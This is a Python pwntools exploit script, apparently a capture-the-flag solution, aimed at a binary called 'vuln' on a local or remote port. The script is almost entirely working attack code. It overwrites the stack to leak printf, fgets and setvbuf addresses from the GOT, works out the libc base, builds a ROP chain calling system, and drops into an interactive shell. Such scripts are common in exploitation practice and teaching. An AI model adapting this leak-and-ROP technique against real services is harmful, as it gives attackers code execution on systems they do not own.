#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 42006)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

ret = exe.sym.vuln + 110

def leak(address):
    # ret needed to keep stack aligned
    io.sendlineafter("Enter your name: ", flat({
        24: address,
        40: [ret, exe.sym.vuln]
    }))

    io.recvuntil("running \"")
    return u64(io.recvuntil("\".", drop=True).ljust(8, b"\0"))

print(f"printf: 0x{leak(exe.got.printf):016x}")
print(f"fgets: 0x{leak(exe.got.fgets):016x}")
print(f"setvbuf: 0x{leak(exe.got.setvbuf):016x}")

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    # https://libc.blukat.me/?q=setvbuf%3A0x00007f796cc80e60%2Cprintf%3A0x00007f796cc5de10%2Cfgets%3A0x00007f796cc7e7b0&l=libc6_2.31-0ubuntu9.2_amd64
    libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so")

libc.address = leak(exe.got.printf) - libc.sym.printf
rop = ROP(libc)

rop.call("system", (exe.sym.target,))

# ret needed to keep stack aligned
io.sendlineafter("Enter your name: ", flat({
    24: exe.sym.target,
    40: [ret, rop.build()]
}))

io.interactive()
